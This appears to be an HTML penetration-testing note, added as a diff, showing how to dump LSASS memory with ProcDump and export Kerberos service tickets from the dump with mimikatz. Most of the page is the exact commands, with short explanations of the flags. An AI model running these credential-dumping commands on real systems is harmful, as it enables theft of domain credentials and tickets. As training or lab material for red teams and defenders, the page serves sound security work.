@@ -1,0 +1,34 @@
+<!doctype html>
+<html>
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>3. Dumping and Extracting ServiceTickets</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+</head>
+
+<body>
+  <div class='page'>
+    <h1 class='title'>3. Dumping and Extracting ServiceTickets</h1><br /><strong>Dumping LSASS memory with
+      ProcDump</strong><br />Download ProcDump: <a
+      href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump" target="_blank">https://docs.microsoft.com/en-us/sysinternals/downloads/procdump</a><br />1.
+    Run cmd or Powershell as Administrator<br />2. Dump<br />
+    <div class="codebox">
+      <div class="codebox">PS&gt;&nbsp;./procdump.exe&nbsp;-accepteula&nbsp;-ma&nbsp;lsass.exe&nbsp;lsassDump.dmp</div>
+    </div><br /> <strong>-accepteula</strong> → to accept the EULA<br /> <strong>-ma</strong> → to dump the entire
+    memory<br /> <a href=""><img src="images/1134-1.png" alt="images/1134-1.png" /></a><br /><br /><strong>Extracting
+      the tickets from memory dump(.dmp) with Mimikatz</strong><br />Download mimikatz: <a
+      href="https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20200918-fix" target="_blank">https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20200918-fix</a><br />
+    <div class="codebox">
+      <div class="codebox">
+        PS&gt;&nbsp;./mimikatz.exe<br />PS&gt;&nbsp;sekurlsa::minidump&nbsp;C:\Users\pparker\Desktop\Procdump\lsassDump.dmp&nbsp;&nbsp;&nbsp;#load&nbsp;our&nbsp;dump&nbsp;fille<br />PS&gt;&nbsp;sekurlsa::tickets&nbsp;/export&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#export&nbsp;tickets&nbsp;from&nbsp;the&nbsp;dump&nbsp;to&nbsp;files<br />PS&gt;<br />PS&gt;
+      </div>
+    </div><br /> <a href=""><img src="images/1134-2.png" alt="images/1134-2.png" /></a><br />All the files are saved in
+    the folder from were we have launched mimikatz<br />In our case:
+    C:\Users\pparker\Desktop\mimikatz_trunk\Win32\<br /> <a href=""><img src="images/1134-3.png"
+        alt="images/1134-3.png" /></a><br />
+  </div>
+</body>
+
+</html>
